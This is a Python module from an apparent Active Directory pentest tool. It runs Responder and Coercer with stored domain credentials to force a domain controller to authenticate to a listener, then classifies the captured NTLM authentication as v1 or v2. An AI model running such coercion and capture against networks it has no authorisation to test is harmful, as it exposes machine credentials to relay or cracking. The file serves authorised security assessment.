"""Interactive NTLM capture probes built on reusable listener/trigger services."""

from __future__ import annotations

from datetime import datetime, timezone
import os
import shlex
from typing import Any, Protocol

from adscan_internal import telemetry
from adscan_internal.path_utils import get_adscan_home
from adscan_internal.rich_output import (
    mark_sensitive,
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_success,
    print_warning,
)
from adscan_internal.integrations.coercer import CoercerRunner, looks_like_ntlm_hash
from adscan_internal.services.ntlm_capture_workflow import (
    NtlmCaptureProbeResult,
    ResponderListener,
    run_ntlm_capture_probe,
)
from adscan_internal.services.current_vantage_reachability_service import (
    resolve_targets_from_current_vantage,
)
from adscan_internal.workspaces import domain_subpath
from adscan_internal.workspaces.computers import count_target_file_entries


class NtlmCaptureShell(Protocol):
    """Minimal shell surface used by the NTLM capture probe CLI."""

    myip: str | None
    interface: str | None
    responder_python: str | None
    coercer_python: str | None
    domains_data: dict[str, dict[str, Any]]
    domains_dir: str
    current_workspace_dir: str | None
    type: str | None
    _last_run_command_error: tuple[str, Exception] | None

    def spawn_command(
        self,
        command: list[str],
        *,
        env: dict[str, str] | None = None,
        shell: bool = False,
        stdout: Any = None,
        stderr: Any = None,
        preexec_fn: Any = None,
    ) -> Any:
        """Spawn a command in the background."""
        ...

    def run_command(
        self, command: Any, *, timeout: int | None = None, **kwargs
    ) -> Any:
        """Run a blocking command."""
        ...

    def save_workspace_data(self) -> bool:
        """Persist workspace state after updating domain metadata."""
        ...


class PreparedNtlmProbe(Protocol):
    """Execution contract for a prepared NTLM probe."""

    domain: str
    pdc_ip: str
    pdc_hostname: str
    username: str
    secret: str
    responder_script: str
    responder_db_path: str
    coercer_script: str


def _parse_probe_args(args: str) -> tuple[str | None, int, int, str | None]:
    """Parse ``check_dc_ntlm_auth_type`` arguments."""

    domain: str | None = None
    capture_timeout = 45
    trigger_timeout = 120
    method_filter: str | None = None

    tokens = shlex.split(str(args or ""))
    index = 0
    while index < len(tokens):
        token = tokens[index]
        if token == "--timeout" and index + 1 < len(tokens):
            capture_timeout = int(tokens[index + 1])
            index += 2
            continue
        if token.startswith("--timeout="):
            capture_timeout = int(token.split("=", 1)[1])
            index += 1
            continue
        if token == "--trigger-timeout" and index + 1 < len(tokens):
            trigger_timeout = int(tokens[index + 1])
            index += 2
            continue
        if token.startswith("--trigger-timeout="):
            trigger_timeout = int(token.split("=", 1)[1])
            index += 1
            continue
        if token == "--method" and index + 1 < len(tokens):
            method_filter = tokens[index + 1]
            index += 2
            continue
        if token.startswith("--method="):
            method_filter = token.split("=", 1)[1]
            index += 1
            continue
        if domain is None:
            domain = token
        index += 1

    return domain, capture_timeout, trigger_timeout, method_filter


def _build_coercer_script_path() -> str:
    """Return the expected local Coercer script path."""

    tools_dir = os.environ.get("ADSCAN_TOOLS_INSTALL_DIR")
    if tools_dir:
        return os.path.join(tools_dir, "coercer", "Coercer.py")
    return os.path.join(str(get_adscan_home()), "tools", "coercer", "Coercer.py")


def _build_responder_paths() -> tuple[str, str]:
    """Return the expected Responder script and SQLite DB paths."""

    tools_dir = os.environ.get("ADSCAN_TOOLS_INSTALL_DIR")
    if tools_dir:
        base_dir = tools_dir
    else:
        base_dir = os.path.join(str(get_adscan_home()), "tools")
    responder_dir = os.path.join(base_dir, "responder")
    return (
        os.path.join(responder_dir, "Responder.py"),
        os.path.join(responder_dir, "Responder.db"),
    )


def _summarize_output(text: str, *, max_lines: int = 12) -> str:
    """Return a compact single-string summary of command output for debug logs."""

    lines = [line.rstrip() for line in str(text or "").splitlines() if line.strip()]
    if not lines:
        return ""
    if len(lines) <= max_lines:
        return "\n".join(lines)
    head_count = max_lines // 2
    tail_count = max_lines - head_count
    summary_lines = lines[:head_count] + ["..."] + lines[-tail_count:]
    return "\n".join(summary_lines)


def _prepare_ntlm_probe(shell: NtlmCaptureShell, domain: str) -> PreparedNtlmProbe | None:
    """Validate domain/tool prerequisites and return normalized probe inputs."""

    domain_data = shell.domains_data.get(domain)
    if not isinstance(domain_data, dict):
        print_error(f"Domain not found in current context: {mark_sensitive(domain, 'domain')}")
        return None

    if not shell.interface or not shell.myip:
        print_error(
            "This probe requires an interface and listener IP. Configure them first with "
            "'set interface <iface>' and ensure 'myip' is available."
        )
        return None

    if not shell.responder_python:
        print_error("Responder Python venv not found. Run 'install' or 'check --fix'.")
        return None

    if not shell.coercer_python:
        print_error("Coercer Python venv not found. Run 'install' or 'check --fix'.")
        return None

    pdc_ip = str(domain_data.get("pdc") or "").strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip()
    username = str(domain_data.get("username") or "").strip()
    secret = str(domain_data.get("password") or "").strip()

    if not pdc_ip or not pdc_hostname:
        print_error(
            "PDC IP/hostname missing for this domain. Ensure Phase 1 or DNS discovery populated "
            "'pdc' and 'pdc_hostname'."
        )
        return None

    if not username or not secret:
        print_error(
            "This probe requires authenticated domain credentials in the current domain context."
        )
        return None

    workspace_dir = str(shell.current_workspace_dir or "").strip() or os.getcwd()
    reachability = resolve_targets_from_current_vantage(
        workspace_dir,
        shell.domains_dir,
        domain,
        targets=[pdc_ip, pdc_hostname, f"{pdc_hostname}.{domain}"],
    )
    if reachability.report_available:
        assessment = next(
            (
                item
                for item in reachability.assessments
                if item.requested_target in {pdc_ip, pdc_hostname, f"{pdc_hostname}.{domain}"}
                and item.matched
            ),
            None,
        )
        if assessment and not assessment.reachable:
            marked_target = mark_sensitive(pdc_ip, "ip")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                f"Skipping coercion precheck in {marked_domain}: current-vantage reachability does not show the target {marked_target} as reachable."
            )
            if reachability.vantage_mode:
                print_info_debug(
                    "[ntlm-capture] reachability precheck blocked probe: "
                    f"target={marked_target} "
                    f"vantage_mode={mark_sensitive(reachability.vantage_mode, 'text')} "
                    f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
                )
            else:
                print_info_debug(
                    "[ntlm-capture] reachability precheck blocked probe: "
                    f"target={marked_target} "
                    f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
                )
            print_instruction(
                "Refresh the network reachability inventory from the current vantage or establish a pivot before retrying this coercion."
            )
            return None
        if assessment and assessment.reachable:
            print_info_debug(
                "[ntlm-capture] current-vantage reachability confirms target access: "
                f"target={mark_sensitive(pdc_ip, 'ip')} "
                f"matched_ips={mark_sensitive(','.join(assessment.matched_ips), 'text')} "
                f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
            )
        else:
            print_info_debug(
                "[ntlm-capture] current-vantage reachability report did not contain an exact match for "
                f"{mark_sensitive(pdc_ip, 'ip')}; proceeding without a hard block."
            )

    responder_script, responder_db_path = _build_responder_paths()
    coercer_script = _build_coercer_script_path()
    if not os.path.exists(responder_script):
        print_error(
            f"Responder script not found at {mark_sensitive(responder_script, 'path')}."
        )
        return None
    if not os.path.exists(coercer_script):
        print_error(
            f"Coercer script not found at {mark_sensitive(coercer_script, 'path')}."
        )
        return None

    class _Prepared:
        pass

    prepared = _Prepared()
    prepared.domain = domain
    prepared.pdc_ip = pdc_ip
    prepared.pdc_hostname = pdc_hostname
    prepared.username = username
    prepared.secret = secret
    prepared.responder_script = responder_script
    prepared.responder_db_path = responder_db_path
    prepared.coercer_script = coercer_script
    return prepared


def _persist_ntlm_probe_result(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    result: NtlmCaptureProbeResult | None,
    status: str,
    reason: str | None,
    reachable_ip_count: int | None = None,
    method_filter: str | None = None,
) -> None:
    """Persist NTLM auth-type probe metadata in ``domains_data`` and workspace JSON."""

    domain_state = shell.domains_data.setdefault(domain, {})
    if not isinstance(domain_state, dict):
        domain_state = {}
        shell.domains_data[domain] = domain_state

    checked_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    auth_type = result.auth_type if result and result.success else None
    probe_state = {
        "status": status,
        "auth_type": auth_type,
        "reason": reason,
        "checked_at": checked_at,
        "source": "coerced_pdc_capture",
        "listener_returncode": result.listener_returncode if result else None,
        "listener_expected_stop": result.listener_expected_stop if result else None,
        "trigger_returncode": result.trigger_returncode if result else None,
        "trigger_error_kind": result.trigger_error_kind if result else None,
        "trigger_error_detail": result.trigger_error_detail if result else None,
        "reachable_ip_count": reachable_ip_count,
        "method_filter": method_filter,
        "workspace_type": str(getattr(shell, "type", "") or "").strip().lower() or None,
    }
    if result and result.observation is not None:
        probe_state["captured_user"] = result.observation.raw_user
        probe_state["capture_version"] = result.observation.ntlm_version

    domain_state["dc_ntlm_auth_type"] = auth_type
    domain_state["dc_ntlm_auth_probe"] = probe_state

    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "[ntlm-capture] failed to persist workspace data after probe update: "
                f"{mark_sensitive(str(exc), 'detail')}"
            )


def _execute_ntlm_capture_probe(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    capture_timeout: int,
    trigger_timeout: int,
    method_filter: str | None,
    reachable_ip_count: int | None = None,
) -> NtlmCaptureProbeResult | None:
    """Run the NTLM auth-type probe and persist the resulting domain metadata."""

    prepared = _prepare_ntlm_probe(shell, domain)
    if prepared is None:
        return None

    marked_domain = mark_sensitive(domain, "domain")
    marked_pdc = mark_sensitive(f"{prepared.pdc_hostname}.{domain}", "hostname")
    marked_listener = mark_sensitive(shell.myip, "ip")
    print_info(
        f"Checking NTLM auth type for PDC {marked_pdc} in domain {marked_domain} "
        f"via coerced authentication to listener {marked_listener}"
    )
    if method_filter:
        print_info(f"Filtering Coercer method: {method_filter}", spacing="none")

    listener = ResponderListener(
        responder_python=shell.responder_python,
        responder_script=prepared.responder_script,
        responder_db_path=prepared.responder_db_path,
        interface=shell.interface,
        shell=shell,
    )
    trigger = CoercerRunner(
        coercer_python=shell.coercer_python,
        coercer_script=prepared.coercer_script,
        run_command=shell.run_command,
        get_last_error=lambda: getattr(shell, "_last_run_command_error", None),
    )

    expected_user = f"{prepared.pdc_hostname}$"
    try:
        result = run_ntlm_capture_probe(
            listener=listener,
            trigger=trigger,
            target=prepared.pdc_ip,
            listener_ip=shell.myip,
            username=prepared.username,
            secret=prepared.secret,
            domain=domain,
            expected_usernames=[expected_user],
            capture_timeout_seconds=capture_timeout,
            trigger_timeout_seconds=trigger_timeout,
            dc_ip=prepared.pdc_ip,
            method_filter=method_filter,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error running NTLM capture probe.")
        print_exception(show_locals=False, exception=exc)
        _persist_ntlm_probe_result(
            shell,
            domain=domain,
            result=None,
            status="error",
            reason=type(exc).__name__,
            reachable_ip_count=reachable_ip_count,
            method_filter=method_filter,
        )
        return None

    _persist_ntlm_probe_result(
        shell,
        domain=domain,
        result=result,
        status="captured" if result.success else "checked",
        reason=result.reason,
        reachable_ip_count=reachable_ip_count,
        method_filter=method_filter,
    )

    redacted_command = list(result.trigger_command)
    if not looks_like_ntlm_hash(prepared.secret):
        for index, token in enumerate(redacted_command):
            if token == "-p" and index + 1 < len(redacted_command):
                redacted_command[index + 1] = "[REDACTED]"
    else:
        for index, token in enumerate(redacted_command):
            if token == "--hashes" and index + 1 < len(redacted_command):
                redacted_command[index + 1] = ":[REDACTED]"
    if redacted_command:
        print_info_debug(
            "[ntlm-capture] trigger command: " + " ".join(map(str, redacted_command))
        )
    print_info_debug(
        f"[ntlm-capture] coercer returncode: {result.trigger_returncode!r}"
    )
    if result.trigger_error_kind:
        print_info_debug(
            "[ntlm-capture] coercer error kind: "
            f"{result.trigger_error_kind} ({result.trigger_error_detail or 'n/a'})"
        )
    if result.listener_returncode is not None:
        print_info_debug(
            "[ntlm-capture] responder listener exited with return code "
            f"{result.listener_returncode!r} (expected_stop={result.listener_expected_stop})"
        )
    if method_filter:
        print_info_debug(f"[ntlm-capture] coercer method filter: {method_filter}")
    should_log_trigger_output = (
        not result.success
        or bool(result.trigger_error_kind)
        or result.trigger_returncode not in (None, 0)
    )
    if should_log_trigger_output and result.trigger_stdout.strip():
        stdout_summary = _summarize_output(result.trigger_stdout)
        print_info_debug(
            "[ntlm-capture] coercer stdout:\n"
            + str(mark_sensitive(stdout_summary, "text"))
        )
    if should_log_trigger_output and result.trigger_stderr.strip():
        stderr_summary = _summarize_output(result.trigger_stderr)
        print_info_debug(
            "[ntlm-capture] coercer stderr:\n"
            + str(mark_sensitive(stderr_summary, "text"))
        )

    return result


def _enabled_computer_ip_count(shell: NtlmCaptureShell, domain: str) -> int:
    """Return the number of enabled computer IPs for the current domain."""

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    targets_file = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        "enabled_computers_ips.txt",
    )
    return count_target_file_entries(targets_file)


def run_ntlm_auth_type_quick_win(shell: NtlmCaptureShell, target_domain: str) -> bool:
    """Run the Phase 3 NTLM auth-type quick win and persist its outcome."""

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    reachable_ip_count = _enabled_computer_ip_count(shell, target_domain)
    print_info_debug(
        f"[ntlm-capture] enabled computer IP count for {mark_sensitive(target_domain, 'domain')}: {reachable_ip_count}"
    )

    if workspace_type == "ctf" and reachable_ip_count < 2:
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"Skipping DC NTLM auth-type check in {marked_domain}: fewer than 2 enabled computer IPs are available for this domain."
        )
        print_info_debug(
            "[ntlm-capture] CTF quick win skipped because enabled computer IP count "
            f"is {reachable_ip_count} (< 2)."
        )
        _persist_ntlm_probe_result(
            shell,
            domain=target_domain,
            result=None,
            status="skipped",
            reason="ctf_enabled_computer_ip_threshold",
            reachable_ip_count=reachable_ip_count,
        )
        return False

    result = _execute_ntlm_capture_probe(
        shell,
        domain=target_domain,
        capture_timeout=45,
        trigger_timeout=120,
        method_filter=None,
        reachable_ip_count=reachable_ip_count,
    )
    if result is None:
        return False

    if result.success and result.observation:
        marked_user = mark_sensitive(result.observation.raw_user, "user")
        print_success(
            f"Captured {result.auth_type} authentication from {marked_user} via PDC coercion."
        )
        print_instruction(
            f"Result: the Domain Controller is authenticating back using {result.auth_type}."
        )
        return True

    if result.reason == "listener_exited_during_capture":
        print_warning(
            "Responder stopped before the capture window completed, so the NTLM probe "
            "result is inconclusive."
        )
    elif result.trigger_returncode not in (None, 0):
        print_warning(
            f"Coercer returned code {result.trigger_returncode} and no capture was observed."
        )
    else:
        print_warning("No NTLM authentication capture was observed from the PDC.")

    if result.reason == "capture_not_observed":
        print_instruction(
            "Try again after confirming LLMNR/NBT-NS/SMB reachability to the listener, or filter "
            "Coercer to a known-working method with --method=<name>."
        )
    return False


def run_check_dc_ntlm_auth_type(shell: NtlmCaptureShell, args: str) -> None:
    """Coerce the PDC to authenticate back and classify NTLMv1 vs NTLMv2."""

    domain, capture_timeout, trigger_timeout, method_filter = _parse_probe_args(args)
    if not domain:
        print_error(
            "Usage: check_dc_ntlm_auth_type <domain> [--timeout=<seconds>] "
            "[--trigger-timeout=<seconds>] [--method=<method_name>]"
        )
        return

    result = _execute_ntlm_capture_probe(
        shell,
        domain=domain,
        capture_timeout=capture_timeout,
        trigger_timeout=trigger_timeout,
        method_filter=method_filter,
    )
    if result is None:
        return

    if result.success and result.observation:
        marked_user = mark_sensitive(result.observation.raw_user, "user")
        print_success(
            f"Captured {result.auth_type} authentication from {marked_user} via PDC coercion."
        )
        print_instruction(
            f"Result: the Domain Controller is authenticating back using {result.auth_type}."
        )
        return

    if result.reason == "listener_exited_during_capture":
        print_warning(
            "Responder stopped before the capture window completed, so the NTLM probe "
            "result is inconclusive."
        )
    elif result.trigger_returncode not in (None, 0):
        print_warning(
            f"Coercer returned code {result.trigger_returncode} and no capture was observed."
        )
    else:
        print_warning("No NTLM authentication capture was observed from the PDC.")

    if result.reason == "capture_not_observed":
        print_instruction(
            "Try again after confirming LLMNR/NBT-NS/SMB reachability to the listener, or filter "
            "Coercer to a known-working method with --method=<name>."
        )


__all__ = [
    "run_check_dc_ntlm_auth_type",
    "run_ntlm_auth_type_quick_win",
]
